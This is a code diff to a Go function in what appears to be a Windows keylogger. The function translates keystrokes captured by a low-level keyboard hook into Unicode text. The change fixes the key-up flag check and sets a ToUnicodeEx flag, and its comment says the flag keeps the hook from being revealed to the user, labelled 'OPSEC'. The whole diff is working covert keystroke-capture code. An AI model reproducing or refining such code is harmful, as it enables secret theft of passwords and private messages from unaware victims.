@@ -182,19 +182,23 @@ func translateKey(vkCode, scanCode, flags uint32, hwnd uintptr) string {
 	hkl, _, _ := procGetKeyboardLayout.Call(uintptr(tid))
 
 	var buf [8]uint16
-	// Bit 0 of flags indicates key-up; ToUnicodeEx expects the high bit of
-	// scanCode to signal key-up transitions.
+	// Bit 7 of KBDLLHOOKSTRUCT.Flags is LLKHF_UP (key-up transition).
+	// Since hookProc only fires on WM_KEYDOWN/WM_SYSKEYDOWN, this bit
+	// should never be set, but we handle it for completeness.
 	sc := scanCode
-	if flags&1 != 0 {
+	if flags&0x80 != 0 {
 		sc |= 0x8000
 	}
+	// wFlags=0x4 prevents ToUnicodeEx from modifying the kernel keyboard
+	// state, which would consume dead key sequences and reveal the hook
+	// to the user (OPSEC). Requires Windows 10 1607+.
 	ret, _, _ := procToUnicodeEx.Call(
 		uintptr(vkCode),
 		uintptr(sc),
 		uintptr(unsafe.Pointer(&keyState[0])),
 		uintptr(unsafe.Pointer(&buf[0])),
 		uintptr(len(buf)),
-		0,
+		0x4,
 		hkl,
 	)
 	n := int(int32(ret))
